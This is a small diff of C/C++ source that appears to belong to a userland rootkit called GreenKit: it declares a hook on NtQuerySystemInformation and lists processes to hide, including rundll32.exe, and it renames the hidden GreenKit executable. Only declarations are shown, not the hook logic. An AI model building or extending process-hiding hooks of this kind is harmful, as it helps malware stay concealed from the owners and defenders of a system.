@@ -4,7 +4,7 @@
 #include "hooking.h"
 
 const wchar_t* m_ProcessToHide = L"rundll32.exe";
-const wchar_t* m_ProcessToHide2 = L"GreenKitExe.exe";
+const wchar_t* m_ProcessToHide2 = L"_greenkit_GreenKitExe.exe";
 
 TD_NtQuerySystemInformation hookNtQuery;
 
